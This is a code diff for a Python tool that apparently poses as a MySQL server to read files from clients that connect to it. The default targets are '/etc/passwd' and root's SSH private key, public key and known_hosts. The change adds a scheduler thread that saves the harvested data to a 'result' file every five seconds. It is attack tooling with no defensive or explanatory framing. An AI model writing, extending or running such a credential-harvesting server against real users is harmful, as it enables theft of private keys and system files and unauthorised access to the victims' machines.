@@ -6,6 +6,7 @@ import os
 from threading import Thread
 from time import *
 import os
+from apscheduler.schedulers.blocking import BlockingScheduler
 
 info = {}
 
@@ -19,6 +20,16 @@ def rand_str(num):
 def str_hex(string):
     return ''.join(['%02x' % x for x in string])
 
+def save_result():
+    f = open("result", "a")
+    f.write(str(info))
+    f.close()
+
+def save_sched():
+    scheduler = BlockingScheduler()
+    scheduler.add_job(save_result, 'interval', seconds=5)
+    scheduler.start()
+
 
 class mysql:
     def __init__(self, addrress, port = 3306, count = 10, file="/etc/passwd"):
@@ -26,6 +37,8 @@ class mysql:
         self.port = port
         self.count = count
         self.files = ['/root/.ssh/known_hosts', '/root/.ssh/id_rsa', '/root/.ssh/id_rsa.pub']
+        t = Thread(target=save_sched, args=())
+        t.start()
     def start(self):
         ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ss.bind((self.addrress, self.port))
